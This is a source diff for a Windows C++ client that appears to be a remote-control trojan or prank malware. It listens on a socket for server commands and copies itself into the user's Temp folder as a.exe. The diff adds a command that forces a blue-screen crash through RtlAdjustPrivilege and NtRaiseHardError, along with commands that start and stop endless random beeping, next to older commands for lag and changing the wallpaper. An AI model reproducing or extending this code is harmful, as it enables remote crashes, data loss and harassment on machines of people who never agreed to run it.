@@ -10,6 +10,7 @@
 #include <stdio.h>
 #include <tchar.h>
 #include <psapi.h>
+#pragma comment(lib, "ntdll.lib") // BSOD
 
 int v=0;
 bool v2=true;
@@ -20,6 +21,7 @@ bool v6=true;
 bool v7=true;
 bool v8=true;
 bool v9=true;
+bool v10=true;
 SOCKET Client;
 addrinfo Server;
 TCHAR name[30]={0};
@@ -28,7 +30,7 @@ char mes[500]={0};
 char Csimb[3]={0};
 char Cbott[3]={0};
 char ctsk[7]={0};
-char ver[50]="1.1.3";
+char ver[50]="1.1.4";
 int simb=0;
 int bott=0;
 int LagCount=0;
@@ -57,11 +59,17 @@ void Lag();
 bool SocketConnected(SOCKET);
 void RandPixel();
 void DataInst();
+void Rbeep();
 //functions to calculate and retrieve CPU Load information
 static float CalculateCPULoad();
 static unsigned long long FileTimeToInt64();
 float GetCPULoad();
 //functions to calculate and retrieve CPU Load information
+
+//BSOD
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
+//BSOD
 
 ///////////////////////////////////////////////////////////////MAIN
 
@@ -730,6 +738,26 @@ void ricevi(SOCKET s)
 				string tmp = "C:\\picture.jpg";
    			 	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID*)tmp.c_str(), SPIF_SENDCHANGE);
 			}
+			if(msg[0]=='Y' && msg[1]=='Y')
+			{
+				cout<<"<Server> BSOD trigger."<<endl;
+				BOOLEAN bl;
+				unsigned long response;
+				RtlAdjustPrivilege(19, true, false, &bl);
+				NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+			}
+			if(msg[0]=='Z' && msg[1]=='Z')
+			{
+				cout<<"<Server> Beep on."<<endl;
+				v10=true;
+				thread rb(Rbeep);
+				rb.detach();
+			}
+			if(msg[0]=='Z' && msg[1]=='R')
+			{
+				cout<<"<Server> Beep off."<<endl;
+				v10=false;
+			}
 		}
 		else
 			Sleep(5000);
@@ -832,7 +860,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\a.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFC[256]={'\0'};
 	char cmd[256]="start \"\" ";
@@ -1193,4 +1221,15 @@ float GetCPULoad()
 {
     FILETIME idleTime, kernelTime, userTime;
     return GetSystemTimes(&idleTime, &kernelTime, &userTime) ? CalculateCPULoad(FileTimeToInt64(idleTime), FileTimeToInt64(kernelTime) + FileTimeToInt64(userTime)) : -1.0f;
+}
+
+void Rbeep()
+{
+	srand(time(0));
+	while(v10)
+	{
+		Beep(rand()%1000+100,100);
+	}
+	
+	return;
 }
